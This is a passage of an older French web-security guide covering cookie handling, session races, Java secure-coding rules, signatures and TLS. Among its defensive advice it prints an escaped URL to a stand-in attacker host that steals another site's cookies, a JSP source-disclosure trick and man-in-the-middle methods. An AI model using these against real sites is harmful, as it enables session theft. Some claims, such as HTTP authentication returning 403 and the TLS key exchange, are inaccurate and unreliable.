+Pour améliorer la sécurité des cookies, il est possible de vérifier l’authentification à l’aide d’autres informations comme l’adresse IP du client. Lors de la création de la session, cette adresse est mémorisée. Lors de la réception d’un cookie, un traitement vérifie que le cookie appartient bien à la même adresse IP. Attention, cela n’interdit pas à un hacker de voler la session, mais c’est un symptôme intéressant à vérifier et à tracer.
+Une durée de vie peut également être gérée côté serveur. Ainsi, un cookie valide n’aura pas une existence suffisamment longue pour permettre à un hacker de pénétrer en force brute une session.
+Tenir sa langue !
+Situation
+Une page retourne un bilan de la commande de l’utilisateur en lui indiquant le numéro de la carte bancaire utilisée, et la somme totale qui y sera prélevée. Cela permet à l’utilisateur de valider une dernière fois sa commande avant le débit de son compte.
+Piratage
+Si un hacker vole un cookie, il peut aller directement sur la page de confirmation. Il demande le rafraîchissement de cette page jusqu'à ce que la victime ait fini sa transaction. Il obtiendra alors le numéro de sa carte de crédit.
+  
+
+Il faut éviter autant que possible de retourner à l’envoyeur des informations confidentielles.
+Des résumés peuvent être suffisants. Par exemple, les quatre premiers chiffres et les deux derniers de la carte bancaire sont suffisants pour permettre à l’utilisateur de vérifier les informations.
+Attention, avec certaines banques, il est possible de calculer le numéro de la carte de crédit à partir du numéro de compte. Certaines informations semblent anodines, mais peuvent avoir une grande valeur pour le hacker.
+Nos patisseries sont Maison
+Situation
+Un site bancaire utilise le protocole HTTPS pour demander l’identification du client, et fait transiter toutes les informations privées à l’aide de ce protocole. Pour identifier l’utilisateur, un cookie n'est envoyé au client qu’une fois celui-ci authentifié.
+Piratage
+Lors du login du client, via le protocole HTTPS, un cookie est émis par le serveur afin de faire référence aux paramètres courants de l’utilisateur. Ce cookie traversant le réseau via un protocole crypté, il n’est pas disponible pour un hacker éventuel.
+Si par la suite le client navigue sur une page du même serveur, mais sans utiliser le protocole HTTPS, la valeur du cookie sera visible sur le réseau. En effet, un cookie est émis pour toute requête au serveur. Un hacker pourra alors le voler, l'utiliser, et ainsi se faire passer pour le client du site. Il pourra ouvrir de nouvelles connexions sécurisées avec le serveur et obtenir des informations confidentielles. Il n’a pas besoin de s’authentifier.
+  
+
+Ce n’est pas la session HTTPS qui identifie le client, mais le Cookie. Celui-ci est donc très important. Si le cookie sert à identifier une session sécurisée, indiquez le paramètre « Secure » pour indiquer qu'il ne doit être émis par le navigateur que par l’intermédiaire d’une connexion sécurisée.
+Set-Cookie: session=123 ; Secure
+Cela demande au navigateur de limiter l’émission de ce cookie aux connexions sécurisées uniquement.
+Ainsi, un hacker ne pourra pas exploiter la demande d’une page non sécurisée pour s'approprier la session.
+  
+
+Limiter le cookie à une branche du serveur n’est pas suffisant. Le pirate peut en effet bénéficier de l’invocation d’une page d’une branche sécurisée pour forcer le navigateur à renvoyer le cookie en clair.
+Souvent, l’utilisateur remplit son panier à l’aide du protocole HTTP, et donne son numéro de carte bancaire à l’aide du protocole HTTPS. Dans cette situation, gérez deux sessions en parallèle, et vérifiez la cohérence de l’une par rapport à l’autre. Par exemple, une session non sécurisée est utilisée lors de la navigation sur le site ( Set-Cookie: id=123 ). Lors du début de la procédure de paiement, une session sécurisée est envoyée au navigateur ( Set-Cookie: paiement=ABC, secure ). Cette information est mémorisée sur le serveur, associée à la session 123.
+Lors de la création de la session sécurisée vérifiez qu’une autre session sécurisée n’existe pas déjà pour le même utilisateur.
+if (Session("123").get("paiement")==null)
+  Session("123").set("paiement","ABC");
+else
+  // Erreur, hacking ?
+Ainsi, si le hacker vole la session non sécurisée, il ne pourra pas en profiter pour voler la session sécurisée. S’il demande à entrer dans une page sécurisée après la victime potentielle, il sera rejeté par les tests correspondants.
+if (Session("paiement")==null)
+  // Erreur
+Tout est mélangé !
+Situation
+Un site demande à l’utilisateur d’entrer de nombreuses informations avant d’effectuer un traitement. Pour cela, il propose une succession de formulaires sur des pages différentes. Chaque formulaire est vérifié avant de passer à l’étape suivante.
+Piratage
+L’ordre de navigation n’est pas contrôlable. Un utilisateur peut ouvrir une autre fenêtre de son navigateur afin de parcourir les formulaires dans deux sessions différentes. Il peut alors mélanger des informations valides et invalides afin de pervertir les données traitées par le serveur.
+Dans l’exemple suivant, l’utilisateur ouvre deux navigateurs avec la même session. Dans la première, il s’identifie en tant que Cresus. Le serveur en déduit un budget maximum à ne pas dépasser (200 €). Comme cette information est difficile à obtenir, elle est mémorisée dans la session de l’utilisateur. Ensuite, l’utilisateur demande l’achat d’un matériel vidéo. Le budget disponible est adapté en conséquence. L’internaute utilise alors la deuxième session pour s’identifier sous le nom de Charlot. Cela entraîne la valorisation du budget maximum à 10 €. Il peut ensuite valider son achat. Avec 10 €, Charlot a pu acheter un produit de 200 € !
+  
+
+Les services Internet imposent généralement un ordre dans la navigation des pages. Un automate à état peut décrire toutes les transitions possibles.
+  
+
+Une transition incorrecte doit conduire à une page d’erreur. Vérifiez précisément le cheminement légal de l’utilisateur et re-vérifier la cohérence de toutes les données avant de valider une transaction. Les tests effectués dans les pages précédentes ne sont pas suffisants.
+Il ne faut pas faire confiance à l’état de l’application mais le contrôler régulièrement.
+Pas tous en même temps !
+Situation
+Une page extrait des informations d’un formulaire, les mémorise dans la session de l’utilisateur, puis les vérifie afin de retourner éventuellement une erreur à l’utilisateur.
+Piratage
+Cette situation arrive souvent en programmation objet. Les champs du formulaire sont placés dans un objet, puis les méthodes correspondantes sont invoquées afin d’effectuer les vérifications nécessaires.
+Les traitements sur le serveur sont par nature multi-tâches. Il est naturel d’avoir plusieurs tâches s’exécutant sur le serveur en même temps afin de pouvoir traiter simultanément plusieurs utilisateurs. Par contre, il est plus rare d’avoir plusieurs tâches s’exécutant simultabnément pour un même utilisateur. Cela se produit généralement lors du rafraîchissement d’une page composée de plusieurs sections (frames). Chacune entraîne l’invocation du serveur. Il n’y a généralement pas d’interaction entre ces traitements.
+Le traitement du formulaire est décomposé en plusieurs étapes : récupération des champs du formulaire, alimentation des champs, vérification des données. Un hacker peut volontairement invoquer simultanément la même page avec des valeurs différentes. Suivant la façon dont la page est construite et le moment que choisit le système d’exploitation pour changer de tâche, le hacker peut valider des informations qui ne devraient pas l'être.
+  
+
+Dans l’exemple précédent, le système d’exploitation a choisi de changer de tâche au bon moment. Le traitement à effectuer lorsque tout est OK s’effectue après la récupération des champs erronés de la deuxième tâche.
+Pour se protéger de cela,
+il faut interdire les accès concurrents en écriture sur la session de l’utilisateur.
+Il peut y avoir plusieurs traitements en lecture, mais un seul en écriture. Si un traitement en écriture commence, il ne faut plus accepter de traitement en lecture tant que l’écriture n’est pas terminée. Cela évite d’avoir des informations inconsistantes.
+Qui a éteint la lumière ?
+Situation
+Une banque met en place un système de sécurité propriétaire afin de limiter les possibilités des hackers.
+Piratage
+Un hacker sera freiné par la complexité et l'opacité d'une l’architecture propriétaire, mais cela ne l’arrêtera pas. Par exemple, Serge Humpich a réussi à casser la carte à puce française après avoir passé deux ans à analyser un terminal de paiement. Il y a trouvé le nécessaire pour construire une carte factice répondant toujours « oui » lors de la vérification du code secret. Il n’avait aucune information particulière, ni bénéficié d’aucune indiscrétion. Il a redécouvert des informations qui étaient publiques.
+Les disques DVD sont chiffrés selon un algorithme secret nommé CSS (Content Scrambling System) , dont les clés sont elles-mêmes chiffrées dans les programmes de lecture agréés. Un groupe norvégien a créé le programme DeCSS qui décode les films DVD et les copie en clair sur le disque dur.
+Les téléphones GSM sont cryptés selon des algorithmes secrets nommés A5/1 pour l’Europe et A5/2 pour l’Asie. Un groupe de cryptanalyse californien a révélé une méthode permettant de craquer l’algorithme A5/2 en temps réel. Ils ont également publié les sources de la version A5/1.
+Cacher le système de sécurité, ou utiliser un système de sécurité propriétaire non documenté n'est pas bon signe. Le protocole HTTPS est public. Il existe des sources en licence libre pour ce protocole. Cela n’affaiblit pas le protocole, au contraire. Comme de très nombreux développeurs ont examiné le code, il y a moins de risques qu’il subsiste des failles dans l’implémentation.
+De plus, les utilisateurs doivent être garantis de leur propre sécurité lors de l’utilisation d’un site. Pour cela, les technologies doivent être publiques et vérifiables. C’est indispensable pour obtenir la confiance des internautes et les inciter à consommer via le réseau.
+Ne comptez pas sur l’obscurité de la technologie pour vous protéger
+La foule des grands jours
+Situation
+Une entreprise effectue tous ses business à l’aide d’un site de commerce électronique.
+Piratage
+Des pirates peuvent individuellement ou en groupe, lancer ou faire lancer par des programmes de très nombreuses requêtes simultanément. Ces requêtes sont volontairement mal formées de façon à provoquer une réaction en chaîne et un dysfonctionnement des systèmes connectés à Internet. Cela a pour conséquence de saturer les services et/ou de les planter. C'est ce qu'on appelle le déni de service réparti (DDoS : Distributed Denial of Service). Il n’y a pas grand-chose à faire contre cela : il faut au minimum limiter la casse. Il ne faut pas que le système tombe dans ce genre de situation, car il peut arriver que des modifications préjudiciables soient apportées aux fichiers en cours de manipulation.
+Pour limiter cela, placez des timeouts sur toutes les connexions et introduire des limites sur le nombre de requêtes simultanées. Les requêtes en excès sont soit placées en attente, soit rejetées avec un message d’excuse.
+Il ne faut pas rejeter un utilisateur ordinaire, mais uniquement les hackers. Il est difficile de reconnaître un hacker d’un utilisateur. Avoir une approche trop restrictive peut faire fuir d’éventuels clients. Une réponse graduelle peut être une bonne approche :
+* Le temps de chaque requête est limité par un timeout.
+* Au-delà de dix requêtes simultanées, les suivantes sont mises en attente.
+* Au-delà de dix requêtes en attente, un message d’erreur et envoyé proposant à l’utilisateur de renouveler ultérieurement sa demande.
+* Au-delà de 10 erreurs par minutes, une liste noire est constituée pour ne plus traiter les paquets venant de serveur particulier ou pour les requêtes ayant un certain format. Les informations de la liste sont rafraîchies suivant une périodicité variable (1 jour par exemple).
+Limitez également :
+* La taille maximale des requêtes HTTP ;
+* La taille maximale des en-têtes HTTP ;
+* Le nombre maximum d’en-têtes ;
+* Le temps maximum pour recevoir une requête ;
+
+
+On a les noms !
+Si une attaque survient, vous devez pouvoir identifier les actions du hacker afin de circonscrire rapidement la faille. Toutes les actions douteuses des utilisateurs doivent pouvoir être tracées. Les échecs d'authentification, les demandes de pages ayant échouées, les champs douteux ayant nécessité un nettoyage, toutes ces informations doivent pouvoir être mémorisées et analysées. D'où l'importance des logs des serveurs web, des serveurs d'applications, des pare-feux, des proxies, des routeurs, …
+Tracer tous les problèmes et toutes les situations anormales.
+Dansons la Java
+Gary McGraw et Ed Felten proposent quelques règles à connaître pour développer un code java moins fragile vis-à-vis de la sécurité. Elles sont nécessaires mais pas suffisantes. Il est facile d’écrire un code qui les respecte et propose malgré tous des failles dans la sécurité. Elles permettent d’avoir un regard critique sur le code et limite fortement les risques. En règle générale, limitez les portions critiques.
+Règle 1 : Ne pas dépendre d’une initialisation.
+Contrairement à ce que l’on pense généralement, il est possible de construire une instance sans appeler le constructeur. Du point de vue de la machine virtuelle, la construction s’effectue en deux étapes : création de l’instance et appel du constructeur. L’instruction new String() est traduite comme ceci :
+new java.lang.String
+dup
+invokespecial void java.lang.String.<init>()
+Un hacker peut facilement générer un code qui n’appelle pas la méthode <init>. L’instance est créée, mais le constructeur n’est pas appelé. Tous les attributs ont une valeur par défaut (null ou zéro).
+Deux méthodes natives permettent également de construire une nouvelle instance sans appeler de constructeur : la méthode Object.clone() et la désérialisation.
+Pour vérifier l’initialisation d’une instance critique, vous devez :
+* Déclarer tous les attributs en private ;
+* Ajouter un attribut qui est valorisé à true lors de chaque constructeur.
+* Toutes les méthodes vérifient la valeur de cet attribut.
+class Security
+{
+  private int attr;
+  private boolean init;
+  public Security()
+  {
+    init=true;
+    attr=10;
+  }
+  public int getAttr()
+  {
+    if (!init) throw new SecurityException("Not init !");
+    return attr;
+  }
+}
+De même, l’initialisation d’une classe n’est pas garantie. Il est possible d’écrire un code qui installe une classe sans l’initialiser. Utilisez la même approche défensive avec les méthodes statiques qu’avec les autres méthodes. Toutes les méthodes statiques vérifient que la classe a bien été initialisée.
+Règle 2 : Limitez les accès à votre classe.
+Toutes les méthodes ou tous les attributs non-private sont des points d’entrées pour les hackers. Il est facile de rédiger une sous-classe ou une classe du même package. Cette sous-classe peut modifier le comportement d’une méthode et obtenir ainsi des privilèges ou informations confidentielles. Une classe sensible doit limiter tous les accès anormaux.
+Règle 3 : Déclarez tout en final, sauf si l’inverse est nécessaire.
+Si une classe ou une méthode n’est pas final, un hacker peut chercher à l’étendre et à modifier son comportement. Une classe sensible ne doit pas avoir de méthode non final.
+Règle 4 : Ne pas dépendre des droits d’un package.
+Il est facile d’ajouter une classe à un package. C’est pour cela que les ClassLoader des applets interdisent d’ajouter une classe aux packages java. La version 1.2 de Java bloque le package java. Un accès package ne protège pas la classe.
+Règle 5 : Ne pas utiliser de classes internes.
+Les classes internes sont converties par le compilateur en classe classique. Pour accéder aux attributs private de la classe externe, le compilateur modifie les droits en accès package. Cette modification n’est signalée par aucun message ! Cela est contraire à la règle précédente qui demande à ne pas utiliser ce type d’accès. Rédiger une classe interne peut ouvrir une brèche dans la sécurité.
+Règle 6 : Ne signez pas votre code.
+Une classe non signée n’a pas de privilège. Elle ne peut théoriquement pas causer de dommage.
+Règle 7 : Si vous désirez signer votre code, placez-le dans une seule archive.
+Sur une branche d’un réseau, il est possible de modifier à la volée une page HTML pour lui ajouter une archive modifiant certaines classes signées. Si la même classe est présente dans deux archives, la première rencontrée par le navigateur sera utilisée.
+  
+
+Par exemple, dans le schéma précédant, lorsque la classe MyApp demande le chargement de la classe key, elle va utiliser la version de l’archive Hack.jar. Si des droits avaient été demandés à la machine virtuelle avant l’appel de la classe key, la version modifiée de la classe en bénéficie, alors qu’elle n’est pas signée.
+C’est un moyen facile de prendre la main sur des informations confidentielles. La classe modifiée pourra bénéficier des droits de la classe appelante. Un pirate peut facilement modifier la page HTML qui récupère l’applet pour y ajouter une autre archive.
+Les applets sont signées pour éviter toute modification lors de son transport sur le réseau. Mais, comme la page qui demande l’applet n’utilise pas forcément un protocole sécurisé, il est facile d’ajouter une nouvelle archive qui peut pervertir l’archive signée. Cela remet en cause le principe même de la signature d’une applet. Pour que l’utilisateur soit sécurisé, il faut non seulement que l’archive soit signée, mais que la page qui télécharge l’archive le soit également. Dans cette situation, l’archive sera chargée également par ce protocole. Cela garantit que l’archive ne sera pas modifiée lors de son transport. La signature de l’applet n’apporte pas de sécurité supplémentaire.
+Même si la page qui télécharge l’archive utilise le protocole https, cela ne garantit toujours pas l’absence de risque pour l’applet. En effet, une page précédente, utilisant le protocole http, peut être modifiée pour charger en mémoire les versions modifiées des classes de l’applet. Lorsque la machine virtuelle récupéra l’applet, elle utilisera la version de la classe key présente en mémoire, et non celle présente dans l’archive. Tout dépend du rafraîchissement des classes de la machine virtuelle lors de la navigation entre les pages. Les navigateurs utilisent des stratégies différentes.
+Pour éviter cela, vérifiez lors de l’initialisation de l’applet si toutes les classes qui seront utilisées ont bien été signées par la même entreprise. Pour cela, ajoutez la méthode suivante dans l’applet (et non dans une autre classe).
+private static void checkSign(Class current,Class[] all)
+{
+  System.out.println("CheckSign");
+  SecurityException se=
+    new SecurityException("Mixed signed and unsigned cabinet files");
+  if (!isInit_) throw se;
+  try 
+  {
+    // Version Microsoft IE
+    Class c=Class.forName("com.ms.security.PolicyEngine");
+    java.security.Principal principal = 
+      com.ms.security.PolicyEngine.getPrincipalOfClass(current);
+    for (int i = all.length - 1; i >= 0; --i)
+    {
+      if (!principal.getName().
+        equals(com.ms.security.PolicyEngine.
+          getPrincipalOfClass(all[i]).getName()))
+      {
+        se.printStackTrace();
+        throw se;
+      }
+    }
+    return;
+  }
+  catch (NullPointerException x)
+  {
+    se.printStackTrace();
+    throw se;
+  }
+  catch (ClassNotFoundException x)
+  {
+    // Ignore, not MS
+  }
+  try
+  { 
+    // Version Netscape
+    Class c=Class.forName("netscape.security.PrivilegeManager");
+    netscape.security.PrivilegeManager pm=
+    netscape.security.PrivilegeManager.getPrivilegeManager();
+    netscape.security.Principal[] principals=
+    pm.getClassPrincipals(current);
+    for (int i = all.length - 1; i >= 0; --i)
+    {
+      if (pm.comparePrincipalArray(principals,
+          pm.getClassPrincipals(all[i]))!=pm.EQUAL)
+      {
+        se.printStackTrace();
+        throw se;
+      }
+    }
+    return;
+  } catch (ClassNotFoundException x)
+  {
+    // Ignore, not NS
+  }
+}
+et ajouter dans l’applet :
+public final class MonApplet extends Applet
+{
+  private SignFrame sign_;
+  private static boolean isInit_=false;
+  static
+  {
+    isInit_=true;
+    checkSign(MonApplet.class,
+      new Class[] {Key.class, Login.class});
+  }
+  public void init()
+  {
+    if (!isInit_)
+      throw new SecurityException("Class SignApplet is not initialized.");
+    ...
+  }
+}
+Cela permet de vérifier que l’applet a bien été initialisée, et dans ce cas, qu’une SecurityException n’a pas été émise. La méthode checkSign() reçoit la classe de l’applet, et l’ensemble autres classes nécessaires à celle-ci.
+Règle 8 : Ne permettez pas le clone de votre classe.
+L’interface Clonable permet une duplication automatique d’une instance. Cette duplication n’utilise pas de constructeur. Même si votre classe ne propose pas cette interface, un hacker peut rédiger une classe qui hérite de la vôtre et ajouter l’interface Clonable. Il peut ainsi construire un clone. Pour éviter cela, interdisez la surcharge de la méthode clone().
+public final void clone() throws java.lang.CloneNotSupportedException 
+{
+  throw new java.lang.CloneNotSupportedException();
+}
+Si vous désirez proposer la méthode clone(), vous pouvez vous protéger en la déclarant final.
+public final void clone() throws java.lang.CloneNotSupportedException 
+{
+  super.clone();
+}
+Un hacker ne pourra pas redéfinir la méthode.
+Règle 9 : Ne rendez pas votre classe sérialisable.
+La sérialisation est dangereuse car elle permet, en consultant le flux, de connaître l’état interne d’une instance. Les attributs private deviennent visibles car ils sont sauvés dans le flux. L’API de sérialisation utilise une méthode native particulière pour accéder aux attributs privés d’une instance.
+Pour interdire la sérialisation, vous pouvez ajouter la méthode suivante :
+private final void writeObject(ObjectOutputStream out)
+  throws java.io.IOException 
+{
+  throw new java.io.IOException("Object cannot be serialized");
+}
+Ainsi, une sous-classe ne pourra pas la redéfinir.
+Règle 10 : Ne rendez pas votre classe dé-sérialisable.
+Si votre classe n’est pas Serializable, cela n’implique pas qu’elle ne peut pas être dé-sérialisé. Un pirate peut construire un flux de sérialisation et l’utiliser pour construire une de vos instances. L’API de sérialisation utilise une méthode native pour construire une instance avant de la valoriser.
+Pour interdire cela, ajoutez la méthode readObjet().
+private final void readObject(ObjectInputStream in)
+  throws java.io.IOException
+{
+  throw new java.io.IOException("Class cannot be deserialized");
+}
+Les dernières versions des machines virtuelles interdisent de construire une instance qui n’implémente pas l’interface Serializable.
+Règle 11 : Ne comparez pas les classes par leurs noms.
+Pour savoir si deux instances sont de la même classe ou pour vérifier si une instance est d’un type particulier, comparez les références de type Class et non leurs noms.
+if (a.getClass() == "MaClasse") // NON !
+{
+  ...
+}
+En effet, dans une même machine virtuelle, il est possible d’avoir deux classes de même nom. Pour cela, il faut qu’elles soient chargées par deux ClassLoader différents. Comparez une classe par rapport à l’instance Class de la classe.
+if (a.getClass() == MaClasse.class)
+{
+  ...
+}
+Une autre approche consiste à utiliser instanceof.
+if (obj instanceof MaClasse)
+{
+  ...
+}
+Règle 12 : Les secrets cachés dans une classe ne vous protègent pas.
+Une consultation du fichier .class ou une machine virtuelle vérolée peuvent faire apparaître tous les secrets d’une classe. Il ne faut pas mémoriser une clé privée ou d’autres informations confidentielles dans une classe. Un pirate pourra facilement extraire l’information en analysant le fichier .class.
+Règle 13 : Empêchez la décompilation.
+Les fichiers .class possèdent beaucoup d’informations sur la classe. On y trouve le nom et le type des méthodes et des attributs ; leurs paramètres ; les héritages ; les classes et les méthodes utilisées ; etc.
+Des outils permettent de réduire les informations sémantiques des classes. La plupart des méthodes utilisent alors un nom à un ou deux caractères ; les instructions des différentes méthodes sont entrelacées pour interdire une décompilation ; parfois, les héritages peuvent même être supprimés pour améliorer les performances.
+Conclusion
+Beaucoup d’applications Internet proposent un minimum de sécurité. Il n’y a pas d’identification de l’utilisateur, un simple partage de l’accès à la base de données pour tous les utilisateurs, aucun traitement particulier pour gérer les cookies ou les accès concurrents.
+Par contre, elles possèdent de nombreux outils pour augmenter la sécurité des systèmes d’exploitation et du réseau : pare-feux, TLS, audit, …
+Les pares-feux contrôlent l’accès réseau. Ils interdisent les accès aux serveurs internes et aux interfaces d’administration. Ils ne contrôlent pas l’identification des utilisateurs, ne proposent pas de sécurité au niveau de l’application.
+L’application est le maillon faible des sites Internet. En effet, chaque site est unique. Il n’est pas possible de bénéficier des découvertes sur les failles de sécurité des autres sites. Les produits utilisés pour publier les applications sont régulièrement mis à jour, mais pas l’application elle-même. Réduisez au minimum les portions critiques d’une application et les rendre les plus simples possibles.
+Il faut également faire attention aux fichiers publiés sur le site. Par exemple, évitez la publication des fichiers de backup (.bak ou ~). En effet, ils peuvent posséder les sources des traitements serveurs et faire apparaître ainsi des failles.
+Il est impossible de contourner toutes les failles des navigateurs. Par exemple, IE détermine la provenance d’un cookie en comparant le domaine du serveur du cookie avec le domaine du serveur demandant le cookie. Cette procédure ignore les caractères d’échappement.
+http://www.hack.com%2fdonne_tes_cookies.html%3f.target.com
+Cet URL est analysé comme venant du site target.com. Le site www.hack.com peut alors récupérer les cookies du site target.com. Un site pirate peut obtenir les cookies d’un autre site et ainsi, voler une session.
+Il existe également des failles de sécurité dans les serveurs d’application. Par exemple, les moteurs de servlet exécutés sous Windows, ne gèrent généralement pas correctement la casse des noms de fichiers. Il suffit de demander une page jsp avec l’extension en majuscules pour obtenir le source du fichier !
+La sécurité est un objectif difficile à atteindre. Il ne faut pas baisser sa vigilance. Sécuriser le serveur est une chose, sécuriser le client en est une autre. Ce point est très important pour obtenir la confiance des clients. Les sites doivent pouvoir s’engager sur la sécurité qu’ils proposent au client. Ils ne le font généralement pas. Un audit de sécurité orienté client devrait être fait régulièrement.
+L’architecture la plus simple est la plus sécurisé. Jusqu'à preuve du contraire :
+* proposez une signature via un formulaire HTTPS, affiché dans le navigateur principal ;
+* utilisez un cookie sécurisé pour identifier l’utilisateur ;
+* redemandez la signature du client pour les traitements critiques, si la demande antérieure est trop ancienne ;
+* vérifiez la navigation dans le site (automate rigide, vérification d’attaque inter-site) ;
+* vérifiez strictement les données extérieures à l’application (formulaire, cookie, url)
+Annexe
+
+
+Qu'est-ce qu'une signature ?
+Une signature est un élément aditionnel à un document, prouvant la véracité de celui-ci et l'authenticité du signataire.
+Ce texte est bien de Philippe PRADOS.
+Il contient cinq 'a', deux 'b', cinq 'c', neuf 'd', vingt-deux
+'e', trois 'f', quatre 'g', quatre 'h', vingt et un 'i', un 'j', un
+'k', trois 'l', deux 'm', dix-huit 'n', six 'o', sept 'p', six 'q',
+sept 'r', neuf 's', vingt et un 't', dix-huit 'u', quatre 'v', un
+'w', dix 'x', un 'y' et un 'z'.
+La phrase « Ce texte est bien de Philippe PRADOS »  est signée par le paragraphe suivant. L'algorithme de signature effectue un calcul sur le document et sur lui-même. L'ensemble du texte possède cinq 'a'. Un lecteur humain est parfaitement capable de vérifier la validité du document. Par contre, il est très difficile de modifier une seule lettre du premier paragraphe sans perturber immédiatement l'ensemble de la signature. Sans l'algorithme adéquat, il est quasiment impossible de forger une nouvelle signature.
+Pour signer électroniquement les documents, deux algorithmes sont utilisés : un algorithme de hachage et un algorithme de cryptage.
+Un algorithme de hachage (Message Digest) calcule une valeur déduite du document à signer. Le résultat de cet algorithme est un nombre suffisamment grand pour garantir qu'il est extrêmement difficile de créer un autre document ayant le même résultat (>=128 bits). Le résultat H du document doit être ajouté à celui-ci pour l'authentifier. Ayant un document et un résultat H, il suffit de recalculer la valeur H' du document et de la comparer à la valeur H pour vérifier que le document n'a pas été modifié. Les algorithmes de hachage les plus utilisés sont MD2, MD5 et SHA.
+La valeur H doit être ajoutée au document, mais ne doit pas pouvoir être modifiée. Sinon, il suffirait de modifier le document, de calculer une nouvelle valeur H'', et de remplacer la valeur H par la valeur H''. La valeur H doit être ajoutée au document après avoir subi un algorithme de cryptage pour que l'on ne puisse plus la modifier.
+Il existe deux principes de cryptage : les algorithmes à clés symétriques et les algorithmes à clés asymétriques.
+Un algorithme à clés symétriques indique que la clé permettant de coder le message est la même que la clé permettant de le décoder. Le ou exclusif est un exemple d'algorithme à cryptage symétrique. DES est un autre algorithme symétrique offrant une plus grande résistance. Les algorithmes symétriques ont l'avantage d'être plus rapides que les algorithmes à clés asymétriques.
+Les algorithmes à clés asymétriques n'utilisent pas les mêmes clés pour coder les messages que pour les décoder. Par exemple, l’ajout d’une lettre est un algorithme asymétrique. En effet, pour décoder le message, enlevez une lettre. Le codage est différent du décodage. Un bon algorithme asymétrique est conçu de tel sort qu’il soit impossible de calculer la clé de codage à partir de la clé de décodage ou l’inverse.
+La clé est découpée en deux parties, une publique et l’autre privée. Un message codé avec la clé publique doit être décodé avec la clé privée et réciproquement. Un message codé avec la clé privée doit être décodé avec la clé publique. Cette capacité de codage asymétrique va permettre de signer des documents. Connaissant la clé publique de Paul, vous pouvez vérifier qu'un message est bien de lui. Pour cela, vous utilisez la clé publique de Paul afin de décoder la valeur de hachage. Seul Paul a pu générer une valeur de hachage cryptée, qui peut être décodée avec la clé publique de Paul.
+Pour signer un message, calculez la valeur H, et la crypter avec votre clé privée. Les destinataires du message, connaissant votre clé publique, peuvent vérifier qu’il est bien de vous et qu'il n'a pas été modifié. Ils décodent la valeur de H à l'aide de votre clé publique, et comparent la valeur de H avec la valeur calculée sur le document.
+On remarque dans ce principe, qu'il faut posséder la clé publique d'un individu pour vérifier que le message est bien de lui. Comme dans la vie réelle, il faut un exemplaire de la signature de l'individu. Comment vérifier qu'un message est bien de l'auteur sans connaître la clé publique de l'auteur ? Pour cela, faite appel à une autorité ayant pour charge de contresigner les documents. Ces autorités sont appelées Autorité de certification (Certificate Authority ou CA). Le document va posséder la clé publique de l'auteur. Cette clé publique est contresignée par l'autorité. Connaissant la clé publique du CA, vous pouvez décoder la clé publique de l'auteur, et ensuite décoder la valeur H à l'aide de cette clé publique.
+Le problème est remonté d'un niveau, vous devez posséder la clé publique de l'autorité ! Votre environnement doit en effet indiquer les clés publiques des différentes autorités dont vous avez confiance. Un document contresigné par une autorité que vous n'avez pas enregistrée ne sera pas valide. Les autorités sont comme les préfectures ou les mairies lorsque vous demandez un tampon certifiant une copie d'un document. Si vous recevez un document « certifié conforme », vous consultez le tampon pour savoir si vous pouvez faire confiance au document.
+Les CA demandent un certain nombre de documents avant de contresigner une clé publique. Le travail de vérification de l'individu ou de l'entreprise est fait par l'autorité. Suivant les règles de vérification d'une entreprise ou d'un individu, vous autorisez ou non les signatures contresignées par cette autorité.
+Le protocole SSL 2.0 permet au client d’obtenir la clé publique du serveur, contresigné par une autorité dont la clé publique est présente dans le navigateur. Cela permet à l’internaute d’être certains du responsable juridique du site qu’il consulte.
+Le protocole SSL 3.0 permet au serveur de demander au client de s’identifier à l’aide également d’une clé publique, validé par une autorité. Les clés publiques des deux protagonistes, le serveur et le client, vont permettre l’échange de clés symétriques pour crypter la communication le temps de la session.
+Comment fonctionne TLS ?
+TLS est l’évolution du protocole SSL v3. Lors de l’ouverture de la communication, le serveur expose son certificat numérique. Celui-ci contient la clé publique du serveur et le nom du site. Le certificat est lui-même signé par une autorité. Le client peut consulter le certificat pour accepter ou non la communication.
+Ensuite, deux possibilités : le serveur n’exige rien du client (SSL v2) ou le serveur exige le certificat du client (SSL v3). Si le client présente un certificat certifié par une autorité dont le serveur à confiance, celui-ci accepte la communication.
+Lorsque l’ouverture de la communication est acceptée, le client et le serveur génère chacun un nombre aléatoire. Chaque nombre est envoyé à l’autre.
+Le serveur utilise sa clé privée pour crypter son nombre. Si le client n’a pas de certificat, le client crypte son nombre à l’aide de la clé publique du serveur. Si le client possède un certificat, il crypte son nombre à l’aide de sa clé privée.
+Les deux nombres aléatoires sont regroupés chez le client et le serveur afin de servir de clé de session (40, 56 ou 128 bits). La clé de session est alors utilisée pour crypter la communication avec un algorithme à clés symétriques.
+La procédure d’ouverture de communication est longue (Il existe un cache pour éviter les reconnexions). Elle exige des aller-retours entre le client et le serveur. Le temps de latence est important. Le temps d’encodage des données est non négligeable et consomme des ressources.
+TLS empêche :
+* l’écoute du réseau ;
+* le spoofing, car le nom du serveur est présent dans le certificat ;
+* l’homme au milieu car celui-ci ne connaît pas la clé privée du serveur.
+Utiliser TLS pour crypter le format HTML expose à une attaque par texte clair estimé. La répétition et le volume tuent le secret TLS. Augmenter l'entropie des données avant chiffrement est un principe de base. Il est préférable de compresser les données avant de les crypter.
+Homme au milieu
+Les développeurs imaginent souvent qu’un pirate peut très difficilement se placer en position d’homme au milieu. Il n’en est rien. Quels sont les différentes techniques pour faire cela ? Il y en a de nombreuses.
+On peut citer :
+* Modification du fichier host du poste de la victime. Ce fichier possède un annuaire permettant de convertir le nom d’un serveur en son adresse IP. Comment modifier ce fichier ? Pour cela, il faut intervenir physiquement sur le poste de la victime ou via le réseau d’entreprise, ou bien, envoyer à la victime un virus ou un cheval de Troie qui se chargera d’effectuer les changements.
+* Emettre des paquets particulier sur le réseau au bon moment. Généralement, lors du démarrage du poste de travail, l’ordinateur demande au réseau de lui donner une adresse IP, l’adresse d’un routeur et éventuellement, l’adresse d’un serveur DNS. Un pirate peut répondre à cette demande en envoyant une adresse d’un routeur ou d’un serveur DNS piraté.
+* Empoisonner le serveur DNS de l’entreprise. Il existe de nombreuses techniques pour placer dans le cache du serveur DNS de l’entreprise, une information erronée.
+* Modifier un des éléments du réseau traversé (routeur, proxy, etc.) Un administrateur d’une entreprise peut très facilement remplacer le proxy de celle-ci par une version piratée.
+Identification et HTTP
+Le protocole HTTP propose un mécanisme simple d’authentification. Lorsqu’une page est demandé sur le serveur, celui-ci peut exiger l’identification de l’utilisateur. Pour cela, il retourne une erreur 403. Le navigateur ouvre alors une boîte de dialogue pour demander à l’utilisateur d’entrer son nom et son mot de passe.
